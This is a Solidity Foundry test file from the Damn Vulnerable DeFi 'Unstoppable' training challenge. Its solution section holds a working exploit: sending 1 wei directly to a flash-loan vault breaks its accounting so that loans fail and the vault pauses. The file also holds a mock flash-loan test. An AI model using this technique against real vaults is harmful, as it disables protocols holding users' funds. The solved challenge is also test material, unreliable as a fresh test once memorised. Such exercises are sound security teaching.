// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
import {IERC3156FlashBorrower, IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156.sol";
import {SafeTransferLib, ERC4626, ERC20} from "solmate/tokens/ERC4626.sol";

contract UnstoppableChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address monitor = makeAddr("monitor");

    uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;

    DamnValuableToken public token;
    UnstoppableVault public vault;
    UnstoppableMonitor public monitorContract;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token and vault
        token = new DamnValuableToken();
        vault = new UnstoppableVault({
            _token: token,
            _owner: deployer,
            _feeRecipient: deployer
        });

        // Deposit tokens to vault
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));

        // Fund player's account with initial token balance
        token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);

        // Deploy monitor contract and grant it vault's ownership
        monitorContract = new UnstoppableMonitor(address(vault));
        vault.transferOwnership(address(monitorContract));

        // Monitor checks it's possible to take a flash loan
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(true);
        monitorContract.checkFlashLoan(100e18);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Check initial token balances
        assertEq(token.balanceOf(address(vault)), TOKENS_IN_VAULT);
        assertEq(token.balanceOf(player), INITIAL_PLAYER_TOKEN_BALANCE);

        // Monitor is owned
        assertEq(monitorContract.owner(), deployer);

        // Check vault properties
        assertEq(address(vault.asset()), address(token));
        assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
        assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50000e18);

        // Vault is owned by monitor contract
        assertEq(vault.owner(), address(monitorContract));

        // Vault is not paused
        assertFalse(vault.paused());

        // Cannot pause the vault
        vm.expectRevert("UNAUTHORIZED");
        vault.setPause(true);

        // Cannot call monitor contract
        vm.expectRevert("UNAUTHORIZED");
        monitorContract.checkFlashLoan(100e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_unstoppable() public checkSolvedByPlayer {
        uint256 vaultBalance = token.balanceOf(address(vault));

        // Transfer a small amount of tokens directly to the vault
        uint256 amount = 1; // Even 1 wei is enough to cause the imbalance
        token.transfer(address(vault), amount);
    }

    function test_flashloan() public {
        bytes memory data;
        vm.startPrank(player);
        // check maxFlashLoan
        uint256 maxLoan = vault.maxFlashLoan(address(token));
        uint256 loanAmount = 100e18; //maxLoan > 0 ? maxLoan :

        // Approve the vault to spend tokens on behalf of the player
        token.approve(address(vault), loanAmount);

        // Create a mock flash loan borrower
        MockFlashBorrower borrower = new MockFlashBorrower(address(token));

        // Perform the flash loan
        bool success = vault.flashLoan(
            IERC3156FlashBorrower(address(borrower)),
            address(token),
            loanAmount,
            data
        );

        // Assert that the flash loan was successful
        assertTrue(success, "Flash loan should succeed");

        // Check that the borrowed amount was returned
        assertEq(
            token.balanceOf(address(vault)),
            maxLoan,
            "Vault balance should remain unchanged after flash loan"
        );

        vm.stopPrank();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // Flashloan check must fail
        vm.prank(deployer);
        vm.expectEmit();
        emit UnstoppableMonitor.FlashLoanStatus(false);
        monitorContract.checkFlashLoan(100e18);

        // And now the monitor paused the vault and transferred ownership to deployer
        assertTrue(vault.paused(), "Vault is not paused");
        assertEq(vault.owner(), deployer, "Vault did not change owner");
    }
}

contract MockFlashBorrower is IERC3156FlashBorrower {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external override returns (bytes32) {
        require(_token == token, "Unexpected token");

        // Approve the lender to pull the tokens back
        ERC20(token).approve(msg.sender, amount + fee);

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }
}
